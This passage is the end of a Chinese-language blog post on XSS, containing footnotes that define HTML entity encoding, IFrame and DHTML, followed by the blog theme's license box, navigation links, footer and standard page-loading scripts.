+<p>[^html编码]: HTML编码是一种将特殊字符转换为HTML实体的过程。在HTML中，有一些特殊字符具有特殊的含义，比如小于号（&lt;）、大于号（&gt;）、引号（”）、和符号（&amp;）等。如果直接在HTML中使用这些字符，有时会导致解析错误或显示不正常。因此，需要使用HTML编码将这些特殊字符转换为对应的实体或代码。将小于号（&lt;）编码为 <code>&amp;lt</code>，将大于号（&gt;）编码为 <code>&amp;gt</code>，将引号（”）编码为 <code>&amp;quot</code>，将和符号（&amp;）编码为 <code>&amp;amp</code> 等。</p>
+<p>[^IFrame ]: 可以理解是html 的标签<br>[^ dhtml]: DHTML 是一种使 HTML 页面具有动态特性的艺术。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>XSS</div>
+      <div>https://tsy244.github.io/2023/12/01/web/XSS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>December 1, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/05/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/" title="短信轰炸漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">短信轰炸漏洞</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/01/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/" title="XSS">
+                        <span class="hidden-mobile">XSS</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
